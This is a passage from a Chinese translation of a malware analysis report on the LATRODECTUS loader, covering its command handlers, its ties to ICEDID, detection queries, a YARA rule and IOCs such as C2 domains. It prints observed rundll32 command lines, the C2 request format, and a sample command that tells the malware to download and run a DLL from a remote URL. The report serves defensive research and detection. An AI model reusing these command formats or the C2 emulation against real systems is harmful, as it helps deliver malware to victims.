+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520225636-280f7614-16b9-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图 27：Shellcode 执行（处理程序＃14）</td>
+</tr>
+</tbody>
+</table>
+<h3 data-content="1" id="3185479673bc1ce11e643ff6a160eccc">更新/重新启动 - 命令 ID（15）</h3>
+<p>这个处理程序似乎对恶意软件执行二进制更新，下载到的地方，通知现有的线程/互斥体，然后释放。随后删除文件，并在终止现有进程之前下载/执行新的二进制文件。</p>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520225711-3ce8b014-16b9-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图 28：更新处理程序（处理程序＃15）</td>
+</tr>
+</tbody>
+</table>
+<h3 data-content="1" id="338752460c19280a1f351b9ed4c4970b">终止 - 命令 ID（17）</h3>
+<p>此处理程序将终止现有的 LATRODECTUS 进程。</p>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520225752-554af018-16b9-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图 29：自我终止（处理程序＃17）</td>
+</tr>
+</tbody>
+</table>
+<h3 data-content="1" id="76cd9d20881505807c4e81296139b0f9">下载并执行托管的 ICEID 负载 - 命令 ID（18）</h3>
+<p>此命令处理程序从 LATRODECTUS 服务器下载两个 ICEDID 组件，并使用生成的 <code>rundll32.exe</code> 进程执行它们。然而，我们个人尚未观察到这种情况在野外被使用。</p>
+<p>处理程序创建一个包含两个文件的文件夹到 <code>AppData\Roaming\</code> 目录中。这些文件路径和文件名是由一个自定义随机数生成器生成的，我们将在下一节中进行审查。在我们的情况下，这个新文件夹的位置是：</p>
+<div class="highlight"><pre><span></span>C:<span class="se">\U</span>sers<span class="se">\R</span>EM<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\-</span><span class="m">632116337</span>
+</pre></div>
+<p>它从 C2 服务器检索一个文件（ <code>test.dll</code> ），标准的 ICEDID 加载程序，该加载程序以随机生成的文件名（ <code>-456638727.dll</code>）写入磁盘。</p>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520230009-a6c8c6d6-16b9-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图 30：LATRODECTUS 下载 ICEDID 加载程序</td>
+</tr>
+</tbody>
+</table>
+<p>LATRODECTUS 然后会执行类似的步骤，为 ICEDID 负载生成一个随机文件名（ <code>1431684209.dat</code> ）。在执行下载之前，它将设置参数以正确加载 ICEDID。如果您以前遇到过 ICEDID，那么命令行的这一部分应该很熟悉：它用于调用加载器的 ICEDID 导出，同时传递到加密的 ICEDID 负载文件的相对路径。</p>
+<div class="highlight"><pre><span></span>init -zzzz<span class="o">=</span><span class="s2">"-632116337\1431684209.dat"</span>
+</pre></div>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520230120-d10c9fee-16b9-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图31：LATRODECTUS 下载 ICEDID 数据</td>
+</tr>
+</tbody>
+</table>
+<p>LATRODECUS 使用硬编码的 URI（ <code>/files/bp.dat</code> ）从配置的 C2 服务器发起第二个下载请求，将其写入文件（ <code>1431684209.dat</code> ）。研究人员分析<code>bp.dat</code>文件，确认其为常见的加密 ICEDID 有效载荷，通常被称为 <code>license.dat</code> 。</p>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520230229-fa34ef5c-16b9-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图 32：加密的 ICEDID 负载（bp.dat）</td>
+</tr>
+</tbody>
+</table>
+<p>解密文件后，恶意软件研究人员注意到一个熟悉的 129 字节垃圾字节序列被添加到文件前面，然后是自定义的节头。</p>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520230313-14ad680a-16ba-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图 33：解密后的 ICEDID 有效载荷（bp.dat）</td>
+</tr>
+</tbody>
+</table>
+<p>我们的团队能够重新审视先前的工具，并成功解密这个文件，使我们能够重建 PE（ICEDID）。</p>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520230404-32cee6ec-16ba-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图 34：ICEDID YARA 在从 bp.dat 重建的 PE 上触发</td>
+</tr>
+</tbody>
+</table>
+<p>此时，ICEDID 加载器和加密的有效负载已下载到同一文件夹中。</p>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520230513-5bf4ca1e-16ba-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图 35：ICEDID 加载器和加密的有效负载</td>
+</tr>
+</tbody>
+</table>
+<p>这些文件然后使用 <code>rundll32.exe</code> 一起执行，通过 CreateProcessW 和它们各自的参数。下面是观察到的命令行：</p>
+<div class="highlight"><pre><span></span>rundll32.exe C:<span class="se">\U</span>sers<span class="se">\R</span>EM<span class="se">\A</span>ppData<span class="se">\R</span>oaming<span class="se">\-</span><span class="m">632116337</span><span class="se">\-</span><span class="m">456638727</span>.dll,init -zzzz<span class="o">=</span><span class="s2">"-632116337\1431684209.dat"</span>
+</pre></div>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520230629-89260642-16ba-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图 36：Rundll32.exe 执行</td>
+</tr>
+</tbody>
+</table>
+<p>使用我们的 ICEDID YARA 规则扫描由 LATRODECTUS 生成的 <code>rundll32.exe</code>子进程，也表明存在 ICEDID。</p>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520230749-b8e087e0-16ba-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图 37：YARA 内存扫描检测 ICEDID</td>
+</tr>
+</tbody>
+</table>
+<h3 data-content="1" id="bed2313e74db0b24e7d2db819241ade4">信标超时 - 命令 ID（19）</h3>
+<p>LATRODECTUS 支持抖动以进行向 C2 的信标传输。这可以使防御者更难通过网络来源检测到，因为这会引入信标间隔的随机性。</p>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520230831-d1d772ea-16ba-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图 38：调整超时功能（处理程序＃19）</td>
+</tr>
+</tbody>
+</table>
+<p>为了计算超时时间，它通过在屏幕上用户光标位置乘以系统正常运行时间（ <code>GetTickCount</code> ）生成一个随机数。然后将该结果作为参数传递给 RtlRandomEx。</p>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520230956-04a28c50-16bb-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图 39：使用光标位置的随机数生成器</td>
+</tr>
+</tbody>
+</table>
+<h3 data-content="1" id="37004e3b5c63c47c239c0357c42a423a">重置计数器 - 命令 ID（20）</h3>
+<p>此命令处理程序将重置传递给每个通信请求的请求计数器。例如，在第三次回调中，它在这里填充为 3。通过此功能，开发人员可以从 0 开始重置计数。</p>
+<div class="highlight"><pre><span></span><span class="nv">counter</span><span class="o">=</span><span class="m">3</span><span class="p">&amp;</span><span class="nv">type</span><span class="o">=</span><span class="m">4</span><span class="p">&amp;</span><span class="nv">guid</span><span class="o">=</span><span class="m">638507385</span>
+</pre></div>
+<h2 data-content="1" id="b2021191eec35d75f9c34f53b1fd260f">LATRODECTUS / ICEDID 连接</h2>
+<p>ICEDID 和 LATRODECTUS 之间肯定存在某种发展联系或工作安排。以下是观察到的一些相似之处：</p>
+<ul>
+<li>系统发现处理程序中的相同枚举命令</li>
+<li>DLL 导出的所有指针都指向相同的导出函数地址，这是 ICEDID 有效载荷的常见手段</li>
+<li>C2 数据被连接在一起作为 C2 流量请求中的变量</li>
+<li>从处理程序（#18）下载的 <code>bp.dat</code> 文件用于通过 <code>rundll32.exe</code> 执行 ICEDID 有效载荷</li>
+<li>功能似乎是以类似的编码方式编写的</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520231510-bfea4ef8-16bb-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图 40：基于 COM 的定时任务设置 - ICEDID 对比 LATRODECTUS</td>
+</tr>
+</tbody>
+</table>
+<p>研究人员并未得出结论，认为 ICEDID 和 LATRODECTUS 家族之间存在明确的关系，尽管它们至少在表面上是有关联的。ICEDID 具有更成熟的能力，比如用于数据窃取或 BackConnect 模块的能力，并且在几年的时间里有着丰富的文献记录。一个正在考虑的假设是 LATRODECTUS 正在积极开发，作为 ICEDID 的替代品，并且处理程序(#18)被包含在内，直到恶意软件作者对 LATRODECTUS 的能力感到满意。</p>
+<h2 data-content="1" id="3c265ef6a68fb6f6dfc361ace426ef81">沙盒化 LATRODECTUS</h2>
+<p>为了评估 LATRODECTUS 的检测，我们搭建了一个 Flask 服务器，并配置了不同的处理程序，指示受感染的机器在沙盒环境中执行各种操作。这种方法为防御者提供了一个很好的机会，以评估他们的检测和日志工具对每种能力的有效性。可以根据需要交换不同的有效载荷，如 shellcode/二进制文件。</p>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520231636-f345c1e2-16bb-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图 41：命令处理程序被沙盒化</td>
+</tr>
+</tbody>
+</table>
+<p>作为一个例子，对于下载和执行 DLL（处理程序＃13），我们可以向命令调度程序提供以下请求结构（对象类型、处理程序、处理程序参数）</p>
+<div class="highlight"><pre><span></span>COMMAND<span class="p">|</span><span class="m">13</span><span class="p">|</span>http://www.xxx.com/dll, ShowMessage  译注：有修改，原始链接见原文
+</pre></div>
+<p>以下示例描述了之前描述的 RC4 加密字符串，该字符串已经进行了 base64 编码。</p>
+<div class="highlight"><pre><span></span>E3p1L21QSBOqEKjYrBKiLNZJTk7KZn+HWn0p2LQfOLWCz/py4VkkAxSXXdnDd39p2EU<span class="o">=</span>
+</pre></div>
+<p>使用以下 CyberChef 工具，分析人员可以生成加密的命令请求：</p>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520231839-3c8a78ac-16bc-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图 42:通过 CyberChef 进行 DLL 执行处理程序的示例</td>
+</tr>
+</tbody>
+</table>
+<p>使用实际恶意软件代码库，并使用低风险框架执行这些不同的处理程序，防御者可以窥视其安全设备记录的事件、警报和日志。</p>
+<h1 data-content="1" id="a11a4523120fce1897a7b9d7d9801a73">检测 LATRODECTUS</h1>
+<p>以下是在 LATRODECTUS 恶意软件感染过程中触发的 Elastic Defend 保护功能：</p>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520232113-984ecdd2-16bc-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图 43：Elastic Defend对于LATRODECTUS的告警</td>
+</tr>
+</tbody>
+</table>
+<p>以下是预先构建的与 MITRE ATT&amp;CK 对齐的规则及其描述：</p>
+<table>
+<thead>
+<tr>
+<th>ATT&amp;CK 技术</th>
+<th>Elastic 规则</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>T1059.007 - Javascript T1027 - 混淆文件或信息</td>
+<td><a href="https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/execution_oversized_windows_script_execution.toml" target="_blank">可疑的超大型脚本执行</a></td>
+<td>LATRODECTUS 通过超大的 JavaScript 文件传递，平均超过 800KB，其中充满了随机文本。</td>
+</tr>
+<tr>
+<td><a href="https://attack.mitre.org/techniques/T1047/" target="_blank">T1047 - Windows 管理工具</a></td>
+<td><a href="https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/initial_access_execution_via_a_suspicious_wmi_client.toml" target="_blank">可疑 WMI 客户端的执行</a></td>
+<td>Javascript 滴管器调用 WMI 挂载 WEBDAV 共享，并调用 msiexec 安装远程 msi 文件。</td>
+</tr>
+<tr>
+<td><a href="https://attack.mitre.org/techniques/T1218/007/" target="_blank">T1218.007 - Misexec</a></td>
+<td>通过 MSIEXEC 可疑的 MsiExec 子进程远程文件执行</td>
+<td>托管在远程 Webdav 上的 MSI 文件以静默模式执行。一旦执行，它会释放一个 DLL 并启动 rundll32 通过 Advanced Installer viewer.exe 二进制文件加载它。</td>
+</tr>
+<tr>
+<td><a href="https://attack.mitre.org/techniques/T1218/011/" target="_blank">T1218.011 - Rundll32</a></td>
+<td><a href="https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/defense_evasion_rundll32_or_regsvr32_loaded_a_dll_from_unbacked_memory.toml" target="_blank">Rundll32 或 Regsvr32 从未备份的内存加载了一个 DLL</a></td>
+<td>Rundll32 从 AppData 加载 LATRODECTUS DLL 并开始代码注入。</td>
+</tr>
+<tr>
+<td><a href="https://attack.mitre.org/techniques/T1055/" target="_blank">T1055 - 进程注入</a></td>
+<td>内存威胁检测警报：来自未签名的 DLL 的 Shellcode 注入 VirtualProtect API 调用来自声誉低的模块的 Shellcode 执行从可疑的未备份内存加载的网络模块</td>
+<td>Shellcode 执行触发了 3 个端点行为警报和一个内存威胁检测警报。</td>
+</tr>
+<tr>
+<td><a href="https://attack.mitre.org/techniques/T1053/005/" target="_blank">T1053.005 - 计划任务</a></td>
+<td><a href="https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/persistence_scheduled_task_creation_by_an_unusual_process.toml" target="_blank">通过一种不寻常的过程创建的计划任务</a></td>
+<td>LATRODECTUS 可能会使用计划任务持续存在（rundll32 将创建一个计划任务）。</td>
+</tr>
+<tr>
+<td><a href="https://attack.mitre.org/techniques/T1070/004/" target="_blank">T1070.004 - 文件删除</a></td>
+<td><a href="https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/defense_evasion_potential_self_deletion_of_a_running_executable.toml" target="_blank">运行中可执行文件的潜在自删除</a></td>
+<td>恶意软件 DLL 的一部分自更新命令，当 DLL 未从 AppData 运行时，LATRODECTUS 将在运行时删除自身，并从新路径重新启动，或者运行一个利用此技术的更新版本。</td>
+</tr>
+<tr>
+<td><a href="https://attack.mitre.org/techniques/T1059/003/" target="_blank">T1059.003 - Windows 命令行</a></td>
+<td><a href="https://github.com/elastic/protections-artifacts/blob/72bede645f2fbb34cf3882fa2758c896a0073c6b/behavior/rules/execution_command_shell_activity_started_via_rundll32.toml" target="_blank">通过 RunDLL32 启动的命令行活动已开始</a></td>
+<td>LATRODECTUS 命令 ID（4）- 通过一系列 cmd.exe 执行收集系统信息。</td>
+</tr>
+</tbody>
+</table>
+<p>以下猎杀和检测查询列表可用于检测以执行为重点的 LATRODECTUS 后渗透命令：</p>
+<p>Rundll32 下载 PE/DLL（命令处理程序＃12、＃13 和＃18）：</p>
+<div class="highlight"><pre><span></span><span class="n">sequence</span> <span class="k">by</span> <span class="n">process</span><span class="p">.</span><span class="n">entity_id</span> <span class="k">with</span> <span class="n">maxspan</span><span class="o">=</span><span class="mi">1</span><span class="n">s</span>
+<span class="p">[</span><span class="n">file</span> <span class="k">where</span> <span class="n">event</span><span class="p">.</span><span class="n">action</span> <span class="o">==</span> <span class="ss">"creation"</span> <span class="k">and</span> <span class="n">process</span><span class="p">.</span><span class="n">name</span> <span class="p">:</span> <span class="ss">"rundll32.exe"</span> <span class="k">and</span> 
+ <span class="cm">/* PE file header dropped to the InetCache folder */</span>
+<span class="n">file</span><span class="p">.</span><span class="n">Ext</span><span class="p">.</span><span class="n">header_bytes</span> <span class="p">:</span> <span class="ss">"4d5a*"</span> <span class="k">and</span> <span class="n">file</span><span class="p">.</span><span class="n">path</span> <span class="p">:</span> <span class="ss">"?:\\Users\\*\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\*"</span><span class="p">]</span>
+<span class="p">[</span><span class="n">network</span> <span class="k">where</span> <span class="n">process</span><span class="p">.</span><span class="n">name</span> <span class="p">:</span> <span class="ss">"rundll32.exe"</span> <span class="k">and</span> 
+   <span class="n">event</span><span class="p">.</span><span class="n">action</span> <span class="p">:</span> <span class="p">(</span><span class="ss">"disconnect_received"</span><span class="p">,</span> <span class="ss">"connection_attempted"</span><span class="p">)</span> <span class="k">and</span> 
+   <span class="cm">/* network disconnect activity to a public Ip address */</span>
+   <span class="k">not</span> <span class="n">cidrmatch</span><span class="p">(</span><span class="n">destination</span><span class="p">.</span><span class="n">ip</span><span class="p">,</span> <span class="ss">"10.0.0.0/8"</span><span class="p">,</span> <span class="ss">"127.0.0.0/8"</span><span class="p">,</span> <span class="ss">"169.254.0.0/16"</span><span class="p">,</span> <span class="ss">"172.16.0.0/12"</span><span class="p">,</span> <span class="ss">"192.0.0.0/24"</span><span class="p">,</span> <span class="ss">"192.0.0.0/29"</span><span class="p">,</span> <span class="ss">"192.0.0.8/32"</span><span class="p">,</span> <span class="ss">"192.0.0.9/32"</span><span class="p">,</span> <span class="ss">"192.0.0.10/32"</span><span class="p">,</span> <span class="ss">"192.0.0.170/32"</span><span class="p">,</span> <span class="ss">"192.0.0.171/32"</span><span class="p">,</span> <span class="ss">"192.0.2.0/24"</span><span class="p">,</span> <span class="ss">"192.31.196.0/24"</span><span class="p">,</span> <span class="ss">"192.52.193.0/24"</span><span class="p">,</span> <span class="ss">"192.88.99.0/24"</span><span class="p">,</span> <span class="ss">"224.0.0.0/4"</span><span class="p">,</span> <span class="ss">"100.64.0.0/10"</span><span class="p">,</span> <span class="ss">"192.175.48.0/24"</span><span class="p">,</span><span class="ss">"198.18.0.0/15"</span><span class="p">,</span> <span class="ss">"198.51.100.0/24"</span><span class="p">,</span> <span class="ss">"203.0.113.0/24"</span><span class="p">,</span> <span class="ss">"240.0.0.0/4"</span><span class="p">,</span> <span class="ss">"::1"</span><span class="p">,</span> <span class="ss">"FE80::/10"</span><span class="p">,</span> <span class="ss">"FF00::/8"</span><span class="p">,</span> <span class="ss">"192.168.0.0/16"</span><span class="p">)]</span>
+</pre></div>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520232630-54efe408-16bd-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图 44：使用hunt 检测LATRODECTUS的EQL查询</td>
+</tr>
+</tbody>
+</table>
+<p>以下是一个 ES|QL 搜索，用于查找 rundll32 到公共 IP 地址（这是不常见的）的长期和/或高数量的网络连接：</p>
+<div class="highlight"><pre><span></span><span class="k">from</span> <span class="n">logs</span><span class="o">-</span><span class="n">endpoint</span><span class="p">.</span><span class="n">events</span><span class="p">.</span><span class="n">network</span><span class="o">-*</span>
+<span class="o">|</span> <span class="k">where</span> <span class="k">host</span><span class="p">.</span><span class="n">os</span><span class="p">.</span><span class="n">family</span> <span class="o">==</span> <span class="ss">"windows"</span> <span class="k">and</span> <span class="n">event</span><span class="p">.</span><span class="n">category</span> <span class="o">==</span> <span class="ss">"network"</span> <span class="k">and</span>
+ <span class="n">network</span><span class="p">.</span><span class="n">direction</span> <span class="o">==</span> <span class="ss">"egress"</span> <span class="k">and</span> <span class="n">process</span><span class="p">.</span><span class="n">name</span> <span class="o">==</span> <span class="ss">"rundll32.exe"</span> <span class="k">and</span>
+<span class="cm">/* excluding private IP ranges */</span>
+ <span class="k">not</span> <span class="n">CIDR_MATCH</span><span class="p">(</span><span class="n">destination</span><span class="p">.</span><span class="n">ip</span><span class="p">,</span> <span class="ss">"10.0.0.0/8"</span><span class="p">,</span> <span class="ss">"127.0.0.0/8"</span><span class="p">,</span> <span class="ss">"169.254.0.0/16"</span><span class="p">,</span> <span class="ss">"172.16.0.0/12"</span><span class="p">,</span> <span class="ss">"192.0.0.0/24"</span><span class="p">,</span> <span class="ss">"192.0.0.0/29"</span><span class="p">,</span> <span class="ss">"192.0.0.8/32"</span><span class="p">,</span> <span class="ss">"192.0.0.9/32"</span><span class="p">,</span> <span class="ss">"192.0.0.10/32"</span><span class="p">,</span> <span class="ss">"192.0.0.170/32"</span><span class="p">,</span> <span class="ss">"192.0.0.171/32"</span><span class="p">,</span> <span class="ss">"192.0.2.0/24"</span><span class="p">,</span> <span class="ss">"192.31.196.0/24"</span><span class="p">,</span> <span class="ss">"192.52.193.0/24"</span><span class="p">,</span> <span class="ss">"192.168.0.0/16"</span><span class="p">,</span> <span class="ss">"192.88.99.0/24"</span><span class="p">,</span> <span class="ss">"224.0.0.0/4"</span><span class="p">,</span> <span class="ss">"100.64.0.0/10"</span><span class="p">,</span> <span class="ss">"192.175.48.0/24"</span><span class="p">,</span><span class="ss">"198.18.0.0/15"</span><span class="p">,</span> <span class="ss">"198.51.100.0/24"</span><span class="p">,</span> <span class="ss">"203.0.113.0/24"</span><span class="p">,</span> <span class="ss">"240.0.0.0/4"</span><span class="p">,</span> <span class="ss">"::1"</span><span class="p">,</span><span class="ss">"FE80::/10"</span><span class="p">,</span> <span class="ss">"FF00::/8"</span><span class="p">)</span>
+<span class="o">|</span> <span class="n">keep</span> <span class="k">source</span><span class="p">.</span><span class="n">bytes</span><span class="p">,</span> <span class="n">destination</span><span class="p">.</span><span class="n">address</span><span class="p">,</span> <span class="n">process</span><span class="p">.</span><span class="n">name</span><span class="p">,</span> <span class="n">process</span><span class="p">.</span><span class="n">entity_id</span><span class="p">,</span> <span class="n">process</span><span class="p">.</span><span class="n">pid</span><span class="p">,</span> <span class="o">@</span><span class="k">timestamp</span><span class="p">,</span> <span class="k">host</span><span class="p">.</span><span class="n">name</span>
+<span class="cm">/* calc total duration and the number of connections per hour */</span>
+<span class="o">|</span> <span class="n">stats</span> <span class="n">count_connections</span> <span class="o">=</span> <span class="k">count</span><span class="p">(</span><span class="o">*</span><span class="p">),</span> <span class="n">start_time</span> <span class="o">=</span> <span class="k">min</span><span class="p">(</span><span class="o">@</span><span class="k">timestamp</span><span class="p">),</span> <span class="n">end_time</span> <span class="o">=</span> <span class="k">max</span><span class="p">(</span><span class="o">@</span><span class="k">timestamp</span><span class="p">)</span> <span class="k">by</span> <span class="n">process</span><span class="p">.</span><span class="n">entity_id</span><span class="p">,</span> <span class="n">process</span><span class="p">.</span><span class="n">pid</span><span class="p">,</span> <span class="n">destination</span><span class="p">.</span><span class="n">address</span><span class="p">,</span> <span class="n">process</span><span class="p">.</span><span class="n">name</span><span class="p">,</span> <span class="k">host</span><span class="p">.</span><span class="n">name</span>
+<span class="o">|</span> <span class="n">eval</span> <span class="n">duration</span> <span class="o">=</span> <span class="n">TO_DOUBLE</span><span class="p">(</span><span class="n">end_time</span><span class="p">)</span><span class="o">-</span><span class="n">TO_DOUBLE</span><span class="p">(</span><span class="n">start_time</span><span class="p">),</span> <span class="n">duration_hours</span><span class="o">=</span><span class="n">TO_INT</span><span class="p">(</span><span class="n">duration</span><span class="o">/</span><span class="mi">3600000</span><span class="p">),</span> <span class="n">number_of_con_per_hour</span> <span class="o">=</span> <span class="p">(</span><span class="n">count_connections</span> <span class="o">/</span> <span class="n">duration_hours</span><span class="p">)</span>
+<span class="o">|</span> <span class="n">keep</span> <span class="k">host</span><span class="p">.</span><span class="n">name</span><span class="p">,</span> <span class="n">destination</span><span class="p">.</span><span class="n">address</span><span class="p">,</span> <span class="n">process</span><span class="p">.</span><span class="n">name</span><span class="p">,</span> <span class="n">process</span><span class="p">.</span><span class="n">pid</span><span class="p">,</span> <span class="n">duration</span><span class="p">,</span> <span class="n">duration_hours</span><span class="p">,</span> <span class="n">number_of_con_per_hour</span><span class="p">,</span> <span class="n">count_connections</span>
+<span class="o">|</span> <span class="k">where</span> <span class="n">count_connections</span> <span class="o">&gt;=</span> <span class="mi">100</span>
+</pre></div>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520232850-a89d0612-16bd-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图 45：使用hunt检测 LATRODECTUS 的 ES QL查询</td>
+</tr>
+</tbody>
+</table>
+<p>以下是 Elastic Defend 在 LATRODECTUS 内存签名上触发的屏幕截图：</p>
+<table>
+<thead>
+<tr>
+<th style=""><img src="https://xzfile.aliyuncs.com/media/upload/picture/20240520232930-c08f1968-16bd-1.png"/></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="">图 46：通过 Elastic Defend 检测LATRODECTUS 的内存签名</td>
+</tr>
+</tbody>
+</table>
+<h2 data-content="1" id="346c56dd005d3b54d272661075ed2e11">YARA</h2>
+<p>Elastic Security已创建了用于识别 LATRODECTUS 的 YARA 规则</p>
+<div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">rule Windows_Trojan_LATRODECTUS_841ff697 {</span>
+    <span class="l l-Scalar l-Scalar-Plain">meta</span><span class="p p-Indicator">:</span>
+        <span class="l l-Scalar l-Scalar-Plain">author = "Elastic Security"</span>
+        <span class="l l-Scalar l-Scalar-Plain">creation_date = "2024-03-13"</span>
+        <span class="l l-Scalar l-Scalar-Plain">last_modified = "2024-04-05"</span>
+        <span class="l l-Scalar l-Scalar-Plain">license = "Elastic License v2"</span>
+         <span class="l l-Scalar l-Scalar-Plain">os = "Windows"</span>
+        <span class="l l-Scalar l-Scalar-Plain">arch = "x86"</span>
+        <span class="l l-Scalar l-Scalar-Plain">threat_name = "Windows.Trojan.LATRODECTUS"</span>
+        <span class="l l-Scalar l-Scalar-Plain">reference_sample = "aee22a35cbdac3f16c3ed742c0b1bfe9739a13469cf43b36fb2c63565111028c"</span>
+
+
+    <span class="l l-Scalar l-Scalar-Plain">strings</span><span class="p p-Indicator">:</span>
+        <span class="l l-Scalar l-Scalar-Plain">$Str1 = { 48 83 EC 38 C6 44 24 20 73 C6 44 24 21 63 C6 44 24 22 75 C6 44 24 23 62 C6 44 24 24 }</span>
+        <span class="l l-Scalar l-Scalar-Plain">$crc32_loadlibrary = { 48 89 44 24 40 EB 02 EB 90 48 8B 4C 24 20 E8 ?? ?? FF FF 48 8B 44 24 40 48 81 C4 E8 02 00 00 C3 }</span>
+        <span class="l l-Scalar l-Scalar-Plain">$delete_self = { 44 24 68 BA 03 00 00 00 48 8B 4C 24 48 FF 15 ED D1 00 00 85 C0 75 14 48 8B 4C 24 50 E8 ?? ?? 00 00 B8 FF FF FF FF E9 A6 00 }</span>
+        <span class="l l-Scalar l-Scalar-Plain">$Str4 = { 89 44 24 44 EB 1F C7 44 24 20 00 00 00 00 45 33 C9 45 33 C0 33 D2 48 8B 4C 24 48 FF 15 7E BB 00 00 89 44 24 44 83 7C 24 44 00 75 02 EB 11 48 8B 44 24 48 EB 0C 33 C0 85 C0 0F 85 10 FE FF FF 33 }</span>
+        <span class="l l-Scalar l-Scalar-Plain">$handler_check = { 83 BC 24 D8 01 00 00 12 74 36 83 BC 24 D8 01 00 00 0E 74 2C 83 BC 24 D8 01 00 00 0C 74 22 83 BC 24 D8 01 00 00 0D 74 18 83 BC 24 D8 01 00 00 0F 74 0E 83 BC 24 D8 01 00 00 04 0F 85 44 02 00 00 }</span>
+        <span class="l l-Scalar l-Scalar-Plain">$hwid_calc = { 48 89 4C 24 08 48 8B 44 24 08 69 00 0D 66 19 00 48 8B 4C 24 08 89 01 48 8B 44 24 08 8B 00 C3 }</span>
+        <span class="l l-Scalar l-Scalar-Plain">$string_decrypt = { 89 44 24 ?? 48 8B 44 24 ?? 0F B7 40 ?? 8B 4C 24 ?? 33 C8 8B C1 66 89 44 24 ?? 48 8B 44 24 ?? 48 83 C0 ?? 48 89 44 24 ?? 33 C0 66 89 44 24 ?? EB ?? }</span>
+        <span class="l l-Scalar l-Scalar-Plain">$campaign_fnv = { 48 03 C8 48 8B C1 48 39 44 24 08 73 1E 48 8B 44 24 08 0F BE 00 8B 0C 24 33 C8 8B C1 89 04 24 69 04 24 93 01 00 01 89 04 24 EB BE }</span>
+<span class="-Error">    </span><span class="l l-Scalar l-Scalar-Plain">condition</span><span class="p p-Indicator">:</span>
+        <span class="l l-Scalar l-Scalar-Plain">2 of them</span>
+<span class="err">}</span>
+</pre></div>
+<h1 data-content="1" id="e67c832b34f4d9770fb3d535cb016e79">IOC</h1>
+<table>
+<thead>
+<tr>
+<th>Observable</th>
+<th>Type</th>
+<th>Name</th>
+<th>Reference</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>aee22a35cbdac3f16c3ed742c0b1bfe9739a13469cf43b36fb2c63565111028c</td>
+<td>SHA-256</td>
+<td>TRUFOS.DLL</td>
+<td>LATRODECTUS</td>
+</tr>
+<tr>
+<td>aytobusesre.com</td>
+<td>domain</td>
+<td></td>
+<td>LATRODECTUS C2</td>
+</tr>
+<tr>
+<td>scifimond.com</td>
+<td>domain</td>
+<td></td>
+<td>LATRODECTUS C2</td>
+</tr>
+<tr>
+<td>gyxplonto.com</td>
+<td>domain</td>
+<td></td>
+<td>ICEDID C2</td>
+</tr>
+<tr>
